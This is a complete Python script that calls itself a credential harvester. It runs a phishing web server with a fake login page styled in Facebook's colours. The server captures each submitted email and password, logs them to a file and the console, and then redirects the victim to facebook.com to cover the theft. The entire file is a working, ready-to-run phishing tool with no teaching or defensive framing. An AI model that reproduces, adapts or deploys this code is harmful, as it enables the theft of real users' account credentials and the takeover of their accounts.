#!/usr/bin/env python3
"""
Professional Credential Harvester Server
Serves a fake login page, captures POST credentials, logs everything to a file.
"""

import argparse
import logging
import re
import subprocess
import sys
import urllib.parse
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
from pathlib import Path

# ------------------------------------------------------------------------------
# DEFAULT CONFIGURATION
# ------------------------------------------------------------------------------
DEFAULT_PORT = 8080
DEFAULT_LOG_FILE = "credentials.log"
HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h2 {{ color: #1877f2; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }}
        button {{ width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ margin-top: 20px; text-align: center; color: #777; }}
        a {{ color: #1877f2; text-decoration: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Log In</h2>
        <form action="/" method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer"><a href="#">Forgot password?</a></div>
    </div>
</body>
</html>"""


# ------------------------------------------------------------------------------
# NETWORK HELPERS
# ------------------------------------------------------------------------------
def get_default_ip():
    """Return the IPv4 address of the default network interface."""
    try:
        # Get default route interface
        route = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        iface = route.split()[4]
        # Get IP of that interface
        addr = subprocess.check_output(["ip", "-4", "addr", "show", iface], text=True)
        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/', addr)
        return match.group(1) if match else "0.0.0.0"
    except Exception:
        return "0.0.0.0"


# ------------------------------------------------------------------------------
# LOGGING SETUP
# ------------------------------------------------------------------------------
def setup_logging(log_file):
    """Configure logging to both file and console."""
    logger = logging.getLogger("CredentialHarvester")
    logger.setLevel(logging.INFO)

    # File handler
    fh = logging.FileHandler(log_file)
    fh.setFormatter(logging.Formatter(
        "[%(asctime)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    logger.addHandler(fh)

    # Console handler (only warnings and above to keep output clean)
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.WARNING)
    ch.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(ch)

    return logger


# ------------------------------------------------------------------------------
# HTTP REQUEST HANDLER
# ------------------------------------------------------------------------------
class CredentialHandler(BaseHTTPRequestHandler):
    """Handle GET (serve login page) and POST (capture credentials)."""

    # Disable default logging to stderr
    def log_message(self, format, *args):
        return

    def __init__(self, *args, **kwargs):
        self.logger = logging.getLogger("CredentialHarvester")
        super().__init__(*args, **kwargs)

    def _log(self, msg):
        """Log a message with the client IP prefix."""
        self.logger.info(f"{self.client_address[0]} - {msg}")

    def do_GET(self):
        """Serve the login page only on '/'."""
        if self.path == "/":
            self._serve_login_page()
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 Not Found")
            self._log(f"GET {self.path} -> 404")

    def do_POST(self):
        """Capture credentials from POST to '/'."""
        if self.path != "/":
            self.send_response(404)
            self.end_headers()
            self._log(f"POST {self.path} -> 404")
            return

        try:
            content_length = int(self.headers.get("Content-Length", 0))
            if content_length == 0:
                self.send_response(400)
                self.end_headers()
                self._log("POST / -> 400 (empty body)")
                return

            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode("utf-8", errors="ignore"))

            email = data.get("email", [""])[0]
            password = data.get("pass", [""])[0]

            # Log captured credentials
            self._log(f"CAPTURED: Email={email}, Pass={password}")
            # Also print to console for immediate feedback
            print(f"\n[+] Credentials from {self.client_address[0]}")
            print(f"    Email: {email}")
            print(f"    Pass:  {password}\n")

            # Redirect to the real site
            self.send_response(302)
            self.send_header("Location", "https://www.facebook.com")
            self.end_headers()

        except Exception as e:
            self._log(f"POST / -> ERROR: {e}")
            self.send_response(500)
            self.end_headers()

    def _serve_login_page(self):
        """Send the HTML login page."""
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()

            # If a custom HTML file was specified, load it; otherwise use template
            if hasattr(self.server, "html_content"):
                html = self.server.html_content
            else:
                html = HTML_TEMPLATE.format(title="Log In")

            self.wfile.write(html.encode("utf-8"))
            self._log("GET / -> 200 (login page)")

        except Exception as e:
            self._log(f"GET / -> ERROR: {e}")
            self.send_response(500)
            self.end_headers()


# ------------------------------------------------------------------------------
# SERVER LAUNCHER
# ------------------------------------------------------------------------------
def run_server(host, port, log_file, html_file=None):
    """Start the credential harvester server."""
    # Set up logging
    logger = setup_logging(log_file)

    # Load custom HTML if provided
    html_content = None
    if html_file:
        try:
            with open(html_file, "r", encoding="utf-8") as f:
                html_content = f.read()
            logger.info(f"Loaded custom HTML from {html_file}")
        except Exception as e:
            logger.error(f"Failed to load HTML file: {e}")
            sys.exit(1)

    # Create server with threaded handler
    server = ThreadingHTTPServer((host, port), CredentialHandler)
    # Attach the HTML content to the server instance for the handler
    if html_content:
        server.html_content = html_content

    print(f"[+] Credential Harvester started on http://{host}:{port}")
    print(f"[+] Credentials will be logged to {log_file}")
    print("[+] Press Ctrl+C to stop.\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
        sys.exit(0)
    except PermissionError:
        print(f"[!] Permission denied for port {port}. Try using sudo or a higher port.")
        sys.exit(1)
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] Port {port} is already in use. Choose another port.")
        else:
            print(f"[!] Error: {e}")
        sys.exit(1)


# ------------------------------------------------------------------------------
# COMMAND-LINE INTERFACE
# ------------------------------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Credential Harvester Server",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "-H", "--host",
        default=get_default_ip(),
        help=f"Bind address (auto-detected as {get_default_ip()})"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=DEFAULT_PORT,
        help="Port to listen on"
    )
    parser.add_argument(
        "-l", "--log-file", default=DEFAULT_LOG_FILE,
        help="File to log captured credentials"
    )
    parser.add_argument(
        "--html", metavar="FILE",
        help="Custom HTML file to serve as the login page"
    )
    args = parser.parse_args()

    run_server(args.host, args.port, args.log_file, args.html)
